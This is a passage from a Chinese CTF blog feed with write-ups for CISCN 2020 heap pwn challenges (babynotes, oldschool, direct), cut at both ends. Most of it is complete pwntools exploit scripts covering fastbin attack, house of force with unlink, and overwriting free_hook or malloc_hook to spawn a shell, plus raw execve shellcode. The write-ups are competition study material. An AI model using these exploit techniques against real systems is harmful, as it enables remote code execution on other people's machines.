class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reg</span><span class="hljs-params">(name,motto,age)</span>:</span>    sa(<span class="hljs-string">'name'</span>,str(name))    sa(<span class="hljs-string">'motto'</span>,str(motto))    sla(<span class="hljs-string">'age'</span>,str(age))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)    <span class="hljs-comment"># if int(idx) &lt;=3:</span>    sla(<span class="hljs-string">'dex'</span>,str(idx))    <span class="hljs-comment"># if int(idx) &gt;3:</span>        <span class="hljs-comment"># idx = </span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'note'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reset</span><span class="hljs-params">(name,motto,age)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'5'</span>)    reg(name,motto,age)name = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x18</span>motto = <span class="hljs-string">'b'</span> * <span class="hljs-number">0x20</span>age = <span class="hljs-number">0x100</span>reg(name,motto,age)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x58</span>) add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>) add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x100</span>) add(<span class="hljs-number">4</span>,<span class="hljs-number">0x18</span>) free(<span class="hljs-number">3</span>)add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>)show(<span class="hljs-number">5</span>)ru(<span class="hljs-string">'ote 5: '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4c78</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)free(<span class="hljs-number">-1</span>)free(<span class="hljs-number">-2</span>)age = <span class="hljs-number">0x1111111100000141</span>reset(name,<span class="hljs-string">' '</span>,age)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>)malloc_hook = <span class="hljs-number">0x3c4aed</span> + libc_basepayload = <span class="hljs-number">11</span> * p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(malloc_hook)edit(<span class="hljs-number">0</span>,payload)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)one = <span class="hljs-number">0xf0364</span> + libc_basepayload = (<span class="hljs-number">0x13</span><span class="hljs-number">-8</span>) * <span class="hljs-string">'1'</span> + p64(<span class="hljs-number">0</span>) + p64(one)edit(<span class="hljs-number">3</span>,payload)free(<span class="hljs-number">3</span>)itr()</code></pre></div><p>还有一种思路，就是因为bss段的age，free（-3）也可以进行free的，控制其为一个0x68堆块地址的话，就可以出现一个0x70的fastbin块，然后其size是不会北抹除的，所以利用uaf直接edit其fd为malloc hook，fastbin attack 攻击即可。</p><h3 id="另一种打法"><a href="#另一种打法" class="headerlink" title="另一种打法"></a>另一种打法</h3><h4 id="addnote-1"><a href="#addnote-1" class="headerlink" title="addnote()"></a>addnote()</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input note size: "</span>);   __isoc99_scanf(<span class="hljs-string">"%lld"</span>, &amp;size);   <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">signed</span> __int64)size &lt;= <span class="hljs-number">0x100</span> )   &#123;</code></pre></div><p>这里有个遗漏点，add的size是可以输入负的</p><h4 id="house-of-force使用条件"><a href="#house-of-force使用条件" class="headerlink" title="house of  force使用条件"></a>house of  force使用条件</h4><p>比赛时没有想到，因为house of  force相关的有点遗忘了。</p><ul><li>可以溢出到top chunk的 size，篡改 size 为一个很大值,就可以轻松的通过top chunk的相关验证，常见就是修改为 <code>-1</code> </li><li>可以申请任意size的堆块，正负都行，但是有不同的攻击限制</li></ul><p>这题是可以满足的:</p><ul><li>利用strcpy来溢出age的数值 ，很简单的控制top chunk的 size</li><li>可以申请负的堆块，负的堆块可以打heap 或者 got ，获取一个任意地址写,<strong>通常应该都是打heap</strong></li></ul><h4 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h4><ul><li>修改top chunk的size</li><li>利用house of  force，将top chunk向前移动，使得其与现有的chunk重合</li><li>然后通过malloc一个小堆块，构造好 fake chunk，控制现有堆的size和prev_size后_</li><li>做unlink，实现任意地址读写。</li></ul><h4 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *sh = process(<span class="hljs-string">'./babynotes'</span>)<span class="hljs-comment"># sh = remote('123.56.170.202',43121)</span>elf = ELF(<span class="hljs-string">'./babynotes'</span>)libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)free_got = elf.got[<span class="hljs-string">'free'</span>]<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(sh)    pause()context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]sh.sendafter(<span class="hljs-string">'Input your name:'</span>,<span class="hljs-string">'haivk'</span>)sh.sendafter(<span class="hljs-string">'Input your motto:'</span>,<span class="hljs-string">'pwnit'</span>)sh.sendlineafter(<span class="hljs-string">'Input your age:'</span>,<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(index,size)</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)   sh.sendlineafter(<span class="hljs-string">'Input index:'</span>,str(index))   sh.sendlineafter(<span class="hljs-string">'Input note size:'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)   sh.sendlineafter(<span class="hljs-string">'Input index:'</span>,str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(index)</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)   sh.sendlineafter(<span class="hljs-string">'Input index:'</span>,str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(index,content)</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)   sh.sendlineafter(<span class="hljs-string">'Input index:'</span>,str(index))   sh.sendafter(<span class="hljs-string">'Input your note:'</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reset</span><span class="hljs-params">()</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'5'</span>)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x100</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>)reset()sh.sendafter(<span class="hljs-string">'Input your name:'</span>,<span class="hljs-string">'haivk'</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">'a'</span>))sh.sendafter(<span class="hljs-string">'Input your motto:'</span>,<span class="hljs-string">'pwnit'</span>)sh.sendlineafter(<span class="hljs-string">'Input your age:'</span>,<span class="hljs-string">'-1'</span>)add(<span class="hljs-number">4</span>,<span class="hljs-number">-0x370</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x20</span>)<span class="hljs-comment">#top chunk上移</span>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0x110</span>))heap0_ptr_addr = <span class="hljs-number">0x6020E0</span>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + p64(heap0_ptr_addr - <span class="hljs-number">0x18</span>) + p64(heap0_ptr_addr - <span class="hljs-number">0x10</span>))debug()<span class="hljs-comment">#unlink</span>delete(<span class="hljs-number">1</span>)debug()edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(free_got))show(<span class="hljs-number">0</span>)sh.recvuntil(<span class="hljs-string">'Note 0: '</span>)free_addr = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))libc_base = free_addr - libc.sym[<span class="hljs-string">'free'</span>]system_addr = libc_base + libc.sym[<span class="hljs-string">'system'</span>]edit(<span class="hljs-number">0</span>,p64(system_addr))edit(<span class="hljs-number">2</span>,<span class="hljs-string">'/bin/sh\x00'</span>)<span class="hljs-comment">#getshell</span>delete(<span class="hljs-number">2</span>)sh.interactive()</code></pre></div><p>exp 来自 haivk 大师傅。</p><h2 id="oldschool"><a href="#oldschool" class="headerlink" title="oldschool"></a>oldschool</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>给了源码，分析程序带来了很大的便利。<br>会发现很多地方对size大小验证不是很多，是负数也行，但是对此题的攻击，用途并不大。</p><div class="hljs"><pre><code class="hljs c">g_ptr =  mmap(ADDR_LOW + idx, ADDR_HIGH - ADDR_LOW - idx, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);</code></pre></div><p>这里可以看到申请的mmap区，是可以进行执行的，可以考虑一下shellcode。</p><h4 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mmap_edit</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">if</span>(g_ptr == <span class="hljs-literal">NULL</span>)&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Mmap first!"</span>);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-keyword">unsigned</span> value;    <span class="hljs-keyword">unsigned</span> idx;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);    idx = get_int();         <span class="hljs-keyword">if</span>(g_ptr + idx &lt; g_ptr &amp;&amp; (<span class="hljs-keyword">unsigned</span>)(g_ptr + idx) &lt; ADDR_HIGH)&#123;        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid idx"</span>);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Value: "</span>);    value = get_int();     g_ptr[idx] = value;&#125;</code></pre></div><p>可以看到其对<code>g_ptr + idx</code>的验证是很简单的，给足大的偏移，可以改到libc的。是一个数组溢出。</p><h3 id="攻击思路-3"><a href="#攻击思路-3" class="headerlink" title="攻击思路"></a>攻击思路</h3><h4 id="思路1"><a href="#思路1" class="headerlink" title="思路1:"></a>思路1:</h4><ul><li>先正常分配，泄漏出libc地址</li><li>分配一下mmap，利用数组溢出，进行修改<code>malloc_hook</code>，为mmap的地址。</li><li>在mmap的内存上填上shellcode</li></ul><h4 id="思路2"><a href="#思路2" class="headerlink" title="思路2:"></a>思路2:</h4><ul><li>先正常分配，泄漏出libc地址</li><li>分配一下mmap，利用数组溢出，进行修改<code>free_hook</code>，为system。</li><li>free 一个 带有<code>/bin/sh</code>的chunk即可</li></ul><p>这个更好点。</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ize'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mmap_add</span><span class="hljs-params">(addr)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'6'</span>)    sla(<span class="hljs-string">'start'</span>,str(addr))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mmap_edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'7'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'lue'</span>,str(data))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    add(i,<span class="hljs-number">0x90</span>)add(<span class="hljs-number">9</span>,<span class="hljs-number">0x10</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i)free(<span class="hljs-number">7</span>)add(<span class="hljs-number">10</span>,<span class="hljs-number">0x10</span>)show(<span class="hljs-number">10</span>)ru(<span class="hljs-string">'ent: '</span>)libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1d8828</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)system = <span class="hljs-number">0x3d200</span> + libc_basefree_hook = <span class="hljs-number">0x1d98d0</span> + libc_basemmap_add(<span class="hljs-number">0</span>)<span class="hljs-string">'''# one wayoffset = ((libc_base+0x1d8788 - 0xe0000000)) / 4mmap_edit(offset,'3758096384')shellcode = '\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80'shellcode = [int(0xd231c931),int(0x2f2f6852),int(0x2f686873),int(0x896e6962),int(0xb0c031e3),int(0x80cd0b)]for i in range(len(shellcode)):    mmap_edit(i,shellcode[i])add(13,0x10)'''</span><span class="hljs-comment"># two way</span>offset = ((free_hook - <span class="hljs-number">0xe0000000</span>)) / <span class="hljs-number">4</span>mmap_edit(offset,int(system))edit(<span class="hljs-number">9</span>,<span class="hljs-string">'/bin/sh\x00'</span> + <span class="hljs-string">'\n'</span>)free(<span class="hljs-number">9</span>)itr()</code></pre></div><h2 id="direct"><a href="#direct" class="headerlink" title="direct"></a>direct</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><ul><li><p>申请的chunk最大值为0x100,max为16个</p></li><li><p>size可以为负值</p><h4 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h4></li><li><p>offset, size 都可以为负值</p></li><li><p><code>read(0, (void *)(heaplist[idx] + offset), nbytes);</code> 这里存在负溢出，可以修改上一个chunk里面的值</p></li></ul><h4 id="open-file函数"><a href="#open-file函数" class="headerlink" title="open file函数"></a>open file函数</h4><ul><li>只能调用一次，调用后可以进行edit chunk</li></ul><h4 id="close-函数"><a href="#close-函数" class="headerlink" title="close 函数"></a>close 函数</h4><div class="hljs"><pre><code class="hljs c">result = (<span class="hljs-keyword">ssize_t</span>)readdir(dirp);    v1 = result;    <span class="hljs-keyword">if</span> ( result )    &#123;      put(<span class="hljs-string">"Filename: "</span>);      result = put2(v1 + <span class="hljs-number">0x13</span>);</code></pre></div><p>进行打印文件名。</p><p>可以看到漏洞点就是在edit那里，且没有show函数。leak libc是此题的难点。因为是没有puts函数进行输出，所以攻击stdout也没有用。</p><p><strong>重点是了解opendir 和 readdir。</strong><br>参考链接：<br><a href="https://blog.csdn.net/cainiao000001/article/details/80988738" target="_blank" rel="noopener">https://blog.csdn.net/cainiao000001/article/details/80988738</a></p><p>可以发现，在调用opendir和readdir后，文件名是存在于内存中的。然后因为程序的写法，会直接输出一下<code>.</code>的文件名，再次调用会输出<code>..</code>的文件名，也是<code>0x13</code>的偏移处。那么想办法溢出修改这附近的内存，在打印文件名的时候，把libc地址也给印出来。</p><h3 id="攻击思路-4"><a href="#攻击思路-4" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>先申请8个堆，然后释放完，让其存在一个在unsortbin的chunk，且留出一个准备上溢出攻击的chunk</li><li>openfile一下，在heap上申请一个巨大的chunk</li><li>上溢出攻击，把加入unsortbin的chunk的size给修改大一点,覆盖到上面那个巨大的chunk，且这个巨大堆的next chunk的prev size 要填上合适的大小，绕过对unsortbin 的检查。</li><li>close一下，会在刚刚巨大的chunk中留下dirent结构体，其中会包含filename</li><li>申请堆到<code>..</code>这个文件名的附近，因为是unsortbin，会在其下面留下libc地址，准备泄漏（这个要注意，尽量不要破坏dirent结构体的数据，破坏后容易无法输出filename）</li><li>上溢攻击<code>..</code>的文件名，给其修改其他合适的名字，泄漏出libc地址</li><li>剩下的就简单了，上溢攻击tcache chain，修改为free hook</li><li>攻击free hook 为one gadget</li></ul><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ize'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,offset,size,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'set'</span>,str(offset))    sla(<span class="hljs-string">'ize'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">openfile</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">closefile</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'5'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    add(i,<span class="hljs-number">0x100</span>)add(<span class="hljs-number">8</span>,<span class="hljs-number">0x18</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i)openfile()add(<span class="hljs-number">9</span>,<span class="hljs-number">0x18</span>)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>)free(<span class="hljs-number">7</span>)data = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x8040</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x110</span>)edit(<span class="hljs-number">8</span>,<span class="hljs-number">-0x120</span>,<span class="hljs-number">0x100</span>,data)data = p64(<span class="hljs-number">0x8170</span>) + p64(<span class="hljs-number">0x20</span>)edit(<span class="hljs-number">0</span>,<span class="hljs-number">-0x30</span>,<span class="hljs-number">0x18</span>,data)closefile()add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x70</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>)data = p64(<span class="hljs-number">0x121111111111</span>)[:<span class="hljs-number">6</span>]print(data)edit(<span class="hljs-number">0</span>,<span class="hljs-number">-0x7fd8</span><span class="hljs-number">-0x30</span>+<span class="hljs-number">2</span>,<span class="hljs-number">0x8</span>,data)closefile()ru(<span class="hljs-string">'\x12'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)data = p64(<span class="hljs-number">0x000000000000</span>)[:<span class="hljs-number">6</span>]edit(<span class="hljs-number">0</span>,<span class="hljs-number">-0x7fd8</span><span class="hljs-number">-0x30</span>+<span class="hljs-number">2</span>,<span class="hljs-number">0x8</span>,data)free_hook = <span class="hljs-number">0x3ed8e8</span> + libc_baseone = <span class="hljs-number">0x4f322</span> + libc_basedata = <span class="hljs-string">'1'</span> * <span class="hljs-number">8</span>edit(<span class="hljs-number">0</span>,<span class="hljs-number">-0x82a0</span>,<span class="hljs-number">8</span>,p64(free_hook))add(<span class="hljs-number">4</span>,<span class="hljs-number">0x100</span>)add(<span class="hljs-number">5</span>,<span class="hljs-number">0x100</span>)edit(<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(one))free(<span class="hljs-number">4</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn 2020初赛部分题目</title>
    <link href="/2020/08/20/ciscn%202020%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <url>/2020/08/20/ciscn%202020%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2020初赛部分题目"><a href="#ciscn-2020初赛部分题目" class="headerlink" title="ciscn  2020初赛部分题目"></a>ciscn  2020初赛部分题目</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h3><p>￼<br>看起来像是非齐次线性方程，那就是就是一个解方程:</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> npa = np.array([[<span class="hljs-number">12</span>, <span class="hljs-number">53</span>, <span class="hljs-number">6</span>,<span class="hljs-number">34</span>,<span class="hljs-number">58</span>,<span class="hljs-number">36</span>,<span class="hljs-number">1</span>],            [<span class="hljs-number">83</span>,<span class="hljs-number">85</span>,<span class="hljs-number">12</span>,<span class="hljs-number">73</span>,<span class="hljs-number">27</span>,<span class="hljs-number">96</span>,<span class="hljs-number">52</span>],            [<span class="hljs-number">78</span>,<span class="hljs-number">53</span>,<span class="hljs-number">24</span>,<span 